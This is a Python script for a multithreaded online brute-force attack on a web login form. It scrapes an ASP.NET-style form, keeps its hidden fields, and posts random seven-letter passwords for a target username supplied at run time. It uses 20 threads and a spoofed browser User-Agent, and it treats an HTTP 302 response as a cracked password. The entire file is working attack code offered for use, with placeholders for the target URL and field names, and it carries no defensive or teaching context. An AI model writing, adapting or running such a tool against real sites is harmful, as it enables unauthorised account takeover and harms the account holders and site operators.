import requests
from bs4 import BeautifulSoup
import time
import random
import string
import threading

def attempt_login(url, username_field, password_field, username, password):
    """Attempts to log in and returns True on success, False otherwise."""
    try:
        session = requests.Session()
        response = session.get(url)
        response.raise_for_status()
        soup = BeautifulSoup(response.content, 'html.parser')

        form = soup.find('form', {'id': 'ctl01'})
        if not form:
            return False

        form_data = {}
        for input_field in form.find_all('input'):
            name = input_field.get('name')
            value = input_field.get('value', '')
            if name:
                form_data[name] = value

        form_data[username_field] = username
        form_data[password_field] = password

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": url
        }

        login_response = session.post(url, data=form_data, headers=headers, allow_redirects=False)
        login_response.raise_for_status()

        return login_response.status_code == 302

    except requests.exceptions.RequestException:
        return False
    except Exception:
        return False

def generate_random_password(length=7):
    """Generates a random password of exactly 7 characters using lowercase and uppercase letters."""
    characters = string.ascii_letters
    return ''.join(random.choice(characters) for _ in range(length))

def worker(url, username_field, password_field, username, found_password):
    """Worker function to generate, attempt login, and repeat."""
    while not found_password.is_set():
        password = generate_random_password()
        print(f"Trying password: {password}", end='\r')
        if attempt_login(url, username_field, password_field, username, password):
            print(f"\nSuccess! Password found: {password}")
            found_password.set()

if __name__ == "__main__":
    login_url = "YOUR_URL_HERE"
    username_field = "txtEmail(change field)"
    password_field = "txtPassword(change field)"

    target_username = input("Enter the target username: ")
    num_threads = 20
    found_password = threading.Event()
    start_time = time.time()

    print(f"Starting real-time brute-force attack with {num_threads} threads for username: {target_username}")

    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=worker, args=(login_url, username_field, password_field, target_username, found_password))
        threads.append(thread)
        thread.start()

    try:
        for thread in threads:
            thread.join()
    except KeyboardInterrupt:
        print("\nBrute-force interrupted by user.")
        found_password.set()
        for thread in threads:
            thread.join()

    end_time = time.time()
    time_taken = end_time - start_time

    if found_password.is_set():
        print(f"Time taken: {time_taken:.2f} seconds")
    else:
        print(f"Password not found within the attempts. Time taken: {time_taken:.2f} seconds")

    print("Brute-force process finished.")
